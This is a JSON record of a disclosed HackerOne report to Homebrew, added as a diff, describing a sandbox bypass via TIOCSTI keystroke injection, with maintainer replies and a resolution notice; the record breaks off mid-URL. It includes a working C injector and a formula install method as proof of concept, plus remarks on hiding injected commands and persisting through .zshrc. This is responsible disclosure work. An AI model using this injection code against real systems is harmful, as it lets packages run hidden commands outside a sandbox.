@@ -1,0 +1,345 @@
+{
+  "id": 1283871,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjgzODcx",
+  "url": "https://hackerone.com/reports/1283871",
+  "title": "Bypass of the installation sandbox by injecting keystrokes with TIOCSTI",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2021-07-30T00:13:55.668Z",
+  "submitted_at": "2021-07-30T00:13:55.725Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gedwards",
+    "url": "/gedwards",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19399,
+    "url": "https://hackerone.com/homebrew",
+    "handle": "homebrew",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Homebrew",
+      "twitter_handle": "MacHomebrew",
+      "website": "https://brew.sh",
+      "about": "The missing package manager for macOS (and Linux)"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-08-30T23:46:16.614Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-30T23:46:16.526Z",
+  "team_member_agreed_on_going_public_at": "2021-08-30T14:43:56.686Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "While doing some internal testing recently, we ran into installation sandboxing and found a way to bypass it so that a formula's install script can execute commands outside of the sandbox.\n\nI understand from https://github.com/Homebrew/brew/issues/2986 that the sandbox is intended to prevent packages from making unwanted changes to users' systems. For example, the sandbox will prevent a formula from writing to a user's home directory like `touch /Users/$(whoami)/example` during the install stage.\n\nThe bypass takes advantage of the fact that the sandbox allows writing to /dev/tty (see [sandbox.rb](https://github.com/Homebrew/brew/blob/a427de5bee50646a974fa8acd96a62ed0fbc10fa/Library/Homebrew/sandbox.rb#L168)) and we can use the TIOCSTI ioctl on that path. TIOCSTI is a call to \"Insert the given byte in the input queue\" which fakes user input.\n\nIn other words, instead of executing the command we want, a small utility program could insert the string `touch /Users/$(whoami)/example` and then a newline into the user's terminal. Once the brew command finishes, the user's shell (outside any sandbox) receives the injected keystrokes and executes them like any other command the user types. (This was largely based on the su attack described at https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking)\n\nHere's an example of a formula using this:\n\n```\n  def install\n    system \"gcc -o bypass bypass.c\"\n    system \"echo\", \"Trying to create ~/poc-sandboxed from inside the sandbox\"\n    # the || true at the end is so the error doesn't make the whole installation fail\n    system \"touch /Users/`whoami`/poc-sandboxed || true\"\n    system \"echo\", \"Using the bypass to create ~/poc-bypassed\"\n    system \"./bypass\", \"touch /Users/`whoami`/poc-bypassed\"\n    # Do something so the installation is successful\n    bin.install \"bypass\"\n  end\n```\n\nThe bypass utility to inject a string into /dev/tty is:\n\n```\n// based on https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <sys/ioctl.h>\nint main(int argc, char *argv[]) {\n    if( argc != 2 ) {\n        printf(\"Usage: %s \\\"command to run\\\"\\n\", argv[0]);\n        return 1;\n    }\n    int fd = open(\"/dev/tty\", O_RDWR);\n    if (fd < 0) {\n        perror(\"open\");\n        return -1;\n    }\n    int ret = ioctl(fd, TIOCSTI, \"\\n\");\n    if (ret == -1) {\n        perror(\"ioctl()\");\n    }\n    char *x = argv[1];\n    while (*x != 0) {\n        ret = ioctl(fd, TIOCSTI, x);\n        if (ret == -1) {\n            perror(\"ioctl()\");\n        }\n        x++;\n    }\n    ret = ioctl(fd, TIOCSTI, \"\\n\");\n    if (ret == -1) {\n        perror(\"ioctl()\");\n    }\n    return 0;\n}\n```\n\nI'm attaching the formula, the tarball, and a demo video which shows the file `poc-bypassed` being created in my home directory by an injected command. I typed all the other commands in the video, but not the `touch` one. In a real attack I would probably also inject a `clear` command or something like that to hide the injected command.\n\nI can think of two approaches to prevent injecting keystrokes like this:\n\n- Programs are only allowed to use TIOCSTI on their own parent terminal. It fails on other /dev/tty* devices even if they're owned by the same user. So if you can create a pty (pseudoterminal) for executing sandboxed commands, it should disconnect them from being able to write into the user's terminal where their shell is running unsandboxed. Ruby has a pty module that seems like it might work for this, but frankly I'm terrible with Ruby and didn't understand the code well enough to add this in correctly (sorry - I tried to make this a simple pull request).\n- Alternately if write access to /dev/tty can be removed from the sandbox profile, that also prevents the TIOCSTI, but that might break other packages if they legitimately write to that device. I don't know how common that is.\n\n## Impact\n\nDuring the installation process, a package can cause commands to be executed outside the sandbox just after installation finishes, making changes to the user's system that would normally be prohibited by the installation sandbox. For example, a malicious package could insert a line into .zshrc to make sure its payload gets executed every time the user opens a terminal. \n\nI consider this relatively low severity because, frankly, the user is installing something and they're probably going to execute part of it sooner or later. But it does break the goal of sandboxing: \"We're making it so users can install from any tap without fearing that it will write random files to random places on their filesystem.\"",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1393646,
+      "file_name": "bypass_demo.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1dsvyn8nmgao2032u73jzesfwfan?response-content-disposition=attachment%3B%20filename%3D%22bypass_demo.mov%22%3B%20filename%2A%3DUTF-8%27%27bypass_demo.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7e890ffb32e552a5abf195b445ace900c4381409e22495b4f6e73a4e808ebccc",
+      "file_size": 3092996,
+      "type": "video/quicktime",
+      "moderated": null
+    },
+    {
+      "id": 1393647,
+      "file_name": "sandbox-bypass.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dvjyizcbla3z3as8p3bjiy8j4n7i?response-content-disposition=attachment%3B%20filename%3D%22sandbox-bypass.rb%22%3B%20filename%2A%3DUTF-8%27%27sandbox-bypass.rb&response-content-type=text%2Fx-ruby-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=185355003e058570d6892d2d525db28db059563185e9814f733cace7c71a5ab3",
+      "file_size": 726,
+      "type": "text/x-ruby-script",
+      "moderated": null
+    },
+    {
+      "id": 1393648,
+      "file_name": "bypass.tar.gz",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/swd3yjpfv5pccjww4gxbope1im4f?response-content-disposition=attachment%3B%20filename%3D%22bypass.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27bypass.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f31145917bec9ca18eee20e9659985f594efce0c8e59e7a560732f11edb65336",
+      "file_size": 484,
+      "type": "application/gzip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-09-29T14:43:56.840Z",
+  "allow_singular_disclosure_after": -62526333.45248348,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "frozensolid",
+    "akashhamal0x01",
+    "prinzhorn"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 2.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 12745286,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for the detailed report, just writing to let you know we're looking into the problem and options you've presented.",
+      "automated_response": false,
+      "created_at": "2021-07-30T08:27:48.607Z",
+      "updated_at": "2021-07-30T08:27:48.607Z",
+      "actor": {
+        "username": "smillernl",
+        "cleared": false,
+        "verified": false,
+        "url": "/smillernl",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/arulcsqd6we9b5y1ndyj8s4uzbbw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%22photo_2021-03-01%2015.42.18.jpeg%22%3B%20filename%2A%3DUTF-8%27%27photo_2021-03-01%252015.42.18.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=826d0ef165e9d0b0f523cb25d1222326aa390b2c6e64786d10174f7b4b169af1"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 12745923,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Just to set expectations: we're happy for this to be eventually disclosed in HackerOne and potentially our blog but getting a fix for this may take some time because some of our team (e.g. me!) are on holiday and moving house the next 1.5 weeks.",
+      "automated_response": false,
+      "created_at": "2021-07-30T08:45:37.330Z",
+      "updated_at": "2021-07-30T08:45:37.330Z",
+      "actor": {
+        "username": "mikemcquaid",
+        "cleared": false,
+        "verified": false,
+        "url": "/mikemcquaid",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2cb238a2b3be66a678f38cd4644566271f9213b0d320b9eabd13122c9fdb1f2"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 12758270,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Got it - thanks for looking into this, but there's no rush as far as I'm concerned.",
+      "automated_response": false,
+      "created_at": "2021-07-30T18:10:50.302Z",
+      "updated_at": "2021-07-30T18:10:50.302Z",
+      "actor": {
+        "username": "gedwards",
+        "cleared": false,
+        "verified": false,
+        "url": "/gedwards",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "homebrew"
+    },
+    {
+      "id": 13159833,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "We've merged a PR for this. It may be that it has unexpected side-effects and needs reverted in which case we'll consider amending our documentation instead. Thanks for the great report!",
+      "automated_response": false,
+      "created_at": "2021-08-25T08:46:18.117Z",
+      "updated_at": "2021-08-25T08:46:18.117Z",
+      "actor": {
+        "username": "mikemcquaid",
+        "cleared": false,
+        "verified": false,
+        "url": "/mikemcquaid",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-